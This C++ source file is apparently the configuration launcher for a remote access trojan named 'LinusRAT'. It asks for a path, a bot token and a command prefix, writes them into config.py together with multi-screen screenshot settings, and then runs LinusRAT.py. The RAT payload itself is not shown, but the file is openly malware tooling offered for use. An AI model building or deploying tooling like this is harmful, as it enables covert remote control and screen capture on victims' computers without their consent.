#include <iostream>
#include <iomanip>
#include <Windows.h>
#include <string>
#include <cstdlib>
#include <fstream>
using namespace std;


#define MAGENTA "\033[35m"
#define RESET   "\033[0m"
#define GREEN   "\033[32m"

int main() {
	std::ofstream file("config.py");
	SetConsoleOutputCP(CP_UTF8);
	string e;
	string path;
	string token;
	string prefix;
	std::cout << MAGENTA << R"(█    ▄█    ▄     ▄      ▄▄▄▄▄   █▄▄▄▄ ██     ▄▄▄▄▀
█    ██     █     █    █     ▀▄ █  ▄▀ █ █ ▀▀▀ █   
█    ██ ██   █ █   █ ▄  ▀▀▀▀▄   █▀▀▌  █▄▄█    █   
███▄ ▐█ █ █  █ █   █  ▀▄▄▄▄▀    █  █  █  █   █    
    ▀ ▐ █  █ █ █▄ ▄█              █      █  ▀     
        █   ██  ▀▀▀              ▀      █         
                                       ▀          
)";

	Sleep(500);

	std::cout << RESET << "Welcome To LinusRAT to begin press "<< MAGENTA << "'E'" << RESET << "\n" << "> ";
	cin >> e;
	if (e == "E")
		std::cout << "Enter The " << MAGENTA << "PATH"  << RESET << "\n" << "> ";
	cin >> path;
	file << "path = " << quoted(path) <<  "\n";
	std::cout << "Enter your " << MAGENTA << "TOKEN" << RESET << "\n" << "> ";
	cin >> token;
	file << "token = " << quoted(token) << "\n";
	file << "pp = " << quoted(path) << "\n";
	std::cout << "Enter the " << MAGENTA << "PREFIX" << RESET << "\n" << "> ";
	cin >> prefix;
	file << "prefix = command_prefix= " << quoted(prefix) << "\n";
	file << R"(
bbox = None
layer = False
allscreens = True
xdisplay = None
window = None

spoil = True
windowTitle = "🚨")";
	file.close();

	std::cout << "Launching " << MAGENTA << "LinusRAT.py" << "\n";
	std::cout << GREEN << "Linus is Online" << "\n"<< RESET << system("python LinusRAT.py");
	
	
	
}